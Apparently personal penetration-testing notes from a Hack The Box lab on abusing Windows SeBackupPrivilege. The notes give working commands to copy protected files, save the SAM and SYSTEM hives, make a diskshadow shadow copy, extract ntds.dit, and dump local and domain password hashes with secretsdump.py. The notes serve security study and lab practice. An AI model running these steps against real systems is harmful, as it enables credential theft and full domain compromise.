# SeBackupPrivilege and SeRestorePrivilege 

* Check with: `whoami /priv`

If we are **SeBackupPrivilege** and **SeRestorePrivilege** we can basically backup (copy) any file we want, ignoring file permissions, making us as powerful as SYSTEM.

In order to use this awesome copying power we need to act as a backup tool, the regular copy command won't work.


## Backup copying

* Source: https://github.com/giuliano108/SeBackupPrivilege

**Note:** The pre-compiled dll's are x64

Howto:
```default
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege

Copy-FileSeBackupPrivilege .\restricted_file.txt c:\temp\stolen.txt -Overwrite
```

The `Set-SeBackupPrivilege` command will set our backup privs to "enabled" if there were "disabled" before.


## Active directory

The Security Account Manager (SAM) manages user account security on Windows. The usernames and hashes of all users are stored in the three registry hives: SAM, SYSTEM and SECURITY.


I am not 100% sure on this, but at least on one box (htb blackfield) I could also just export sam and system as a non-admin, without having to use backup copying:

```default
reg save hklm\sam .\sam
reg save hklm\system  .\system 
download sam
download system
secretsdump.py -system system -sam sam LOCAL
# ... will print local accounts and their password hashes
```

I am not 100% sure whether that is because of SeBackupPrivilege or just a pecularity of that box.

Exporting SAM and SYSTEM worked, but exporting the SECURITY hive did not work though (access denied), so I only got local user hashes out of this (this machine was an AD Domain Controller).

In order to get Active Directory creds I needed to debug-copy the ntds.dit file (C:\Windows\NTDS\ntds.dit). But when I tried to copy it via the above method (Copy-FileSeBackupPrivilege) I got an error telling me the file was busy.

In order to circumvent this, we need to use a disk shadow copy.


Create an ascii text file "command":

```default
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:

```

Make sure to save it with windows line endings (CRLF). Transfer it to the target.

You have to be in a writable location (e.g. a TEMP directory. On PS you can try `cd $env:TEMP`):

```powershell
diskshadow.exe /s .\command
```

The output should look somewhat like this:
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\AppData\Local\Temp\blub> diskshadow.exe /s .\command
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  12/22/2020 11:37:47 AM

-> set context persistent nowriters
-> add volume c: alias temp
-> create
Alias temp for shadow ID {43818beb-b876-4613-ba1e-dda50f5a3ab4} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {341715d3-421e-44a6-9166-af293673b98c} set as environment variable.

Querying all shadow copies with the shadow copy set ID {341715d3-421e-44a6-9166-af293673b98c}

        * Shadow copy ID = {43818beb-b876-4613-ba1e-dda50f5a3ab4}               %temp%
                - Shadow copy set: {341715d3-421e-44a6-9166-af293673b98c}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 12/22/2020 11:37:47 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% z:
-> %temp% = {43818beb-b876-4613-ba1e-dda50f5a3ab4}
The shadow copy was successfully exposed as z:\.
->
```

Now you can just copy the file from the mirror disk:
```powershell
Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit .\ntds.dit
```

Download it to your machine and use secretsdump.py again:
```powershell
secretsdump.py -system system -ntds ntds.dit LOCAL
```

It should dump all the domain users as well.